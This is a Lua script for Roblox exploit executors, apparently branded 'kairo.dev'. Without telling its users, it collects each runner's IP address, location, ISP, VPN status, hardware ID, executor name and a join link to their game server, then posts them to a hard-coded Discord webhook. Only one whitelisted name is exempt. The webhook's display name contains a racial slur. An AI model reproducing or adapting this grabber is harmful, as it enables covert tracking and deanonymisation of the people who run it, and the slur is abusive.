local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = game.Players.LocalPlayer

-- Whitelist
local whitelist = {
    ["worldleaderof2024"] = true,
}

if not whitelist[player.Name] then
    -- Avatar Image
    local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"
    local imageUrl = "https://tr.rbxcdn.com/default_avatar.png"
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(thumbUrl))
    end)
    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
        imageUrl = result.data[1].imageUrl
    end

    -- Executor Detection
    local executor = identifyexecutor and identifyexecutor() or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (syn and "Synapse X") or
        (secure_load and "Sentinel") or
        (KRNL_LOADED and "Krnl") or
        (SONA_LOADED and "Sona") or
        "Unknown Executor"

    -- HWID (Synapse only)
    local hwid = (syn and syn.crypt and syn.crypt.hash and syn.crypt.hash("getfenv")) or "N/A"

    -- IP & Geo Info
    local ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is"))
    local ip = ipData.ip or "N/A"
    local location = ipData.city .. ", " .. ipData.region .. ", " .. ipData.country
    local countryCode = string.lower(ipData.country_code or "")
    local flag = ":flag_" .. countryCode .. ":"
    local isp = ipData.connection and ipData.connection.isp or "N/A"
    local isVPN = tostring(ipData.security and ipData.security.proxy or "Unknown")

    -- Game Info
    local gameId = tostring(game.PlaceId)
    local jobId = tostring(game.JobId)
    local joinLink = "roblox://placeId=" .. gameId .. "&gameInstanceId=" .. jobId

    local gameName = "Unknown Game"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    -- Webhook Data
local imageGifUrl = "https://cdn.discordapp.com/attachments/1344814060004446259/1388579241246986321/3dgifmaker80874.gif?ex=68617eb1&is=68602d31&hm=417e42c401c440534075a0a2f7a3b9596c3206b9616a7316b359bc015b7050fb&"

local data = {
    ["username"] = "kkairo dumb nigga",
    ["avatar_url"] = "https://media.discordapp.net/attachments/1321561728789512212/1388581716263833670/d4dd7ffd8851facc03e2f48a7e205dfd.jpg?ex=686180ff&is=68602f7f&hm=919acf5938f9dbd91cfb8b5b7a5743890540cdfd50a2fe8e656cb99f2334fa3a&=&format=webp",
    ["content"] = player.Name .. " / " .. player.UserId .. " **executed kairo.dev**",
    ["embeds"] = {{
        ["title"] = "Execution Logged",
        ["color"] = 16711680,  -- red color
        ["fields"] = {
            { name = "User ID", value = tostring(player.UserId), inline = true },
            { name = "Executor", value = executor, inline = true },
            { name = "VPN", value = isVPN, inline = true },
            { name = "IP", value = "`" .. ip .. "`", inline = false },
            { name = "HWID", value = "`" .. gethwid() .. "`", inline = false },
            { name = "Location", value = flag .. " " .. location, inline = false },
            { name = "ISP", value = isp, inline = false },
            { name = "Join Game", value = " " .. joinLink .. " ", inline = false }
        },
        ["thumbnail"] = { ["url"] = imageUrl },
        ["image"] = { ["url"] = imageGifUrl },  -- Big image added here
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        ["footer"] = { ["text"] = "Game: " .. gameName .. " | ID: " .. gameId }
    }}
}


    -- Send to Webhook
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local requestFunc = http_request or request or HttpPost or syn.request
    local payload = {
        Url = "https://discord.com/api/webhooks/1387942415792345118/gxvPxaAKWvN1gY2ijvIUNdH2prWpT1PmV7r5R1z2rqX4-vSPDoyKe3YsK6Jpln82zBnV",
        Method = "POST",
        Headers = headers,
        Body = HttpService:JSONEncode(data)
    }

    requestFunc(payload)
end
